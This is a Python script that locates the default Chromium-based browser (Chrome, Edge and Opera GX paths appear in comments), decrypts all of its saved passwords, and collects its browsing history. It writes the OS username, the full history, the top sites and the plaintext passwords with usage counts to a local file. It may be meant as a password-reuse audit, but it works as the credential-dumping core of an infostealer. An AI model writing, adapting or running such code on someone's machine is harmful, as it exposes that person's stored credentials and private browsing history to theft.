import sys
import os
import json

from chromiumBrowser import Chromium
import dataComprehention
import getBrowser

chromiumParams = getBrowser.getChromiumParams()
defaultBrowser = Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])

#googleChrome = Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
#microsoftEdge = Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
#operaGX = Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")

history = defaultBrowser.getHistory()
loginData = defaultBrowser.getLoginData()

passwordsAndFreq = {}
for login in loginData:
    url = login["origin_url"]
    username = login["username_value"]
    ciphertext = login["password_value"]

    if url == "" or username == "": continue
    secretKey = defaultBrowser.getSecretKey()
    password = defaultBrowser.decryptPassword(ciphertext, secretKey)
    if password == '': continue

    if password in passwordsAndFreq.keys(): passwordsAndFreq[password] += 1
    else: passwordsAndFreq[password] = 1
    #print(password)

#print(passwordsAndFreq)

topWebsites = dataComprehention.topWebsitesVisited(history)
#print(topWebsites)

# clear the temp folder to remove clutter
defaultBrowser.cleanup()


username = os.getlogin()
with open(os.path.join(sys.argv[1], "userdata"), "w") as f:
    """
    output = {
        "name": username,
        "history": history,
        "topWebsites": topWebsites,
        "passwordsAndFrequency": passwordsAndFreq
    }
    f.write(json.dumps(output))
    """
    f.writelines([
        username, "\n",
        json.dumps( history ), "\n",
        json.dumps( topWebsites ), "\n",
        json.dumps( passwordsAndFreq ), "\n",
    ])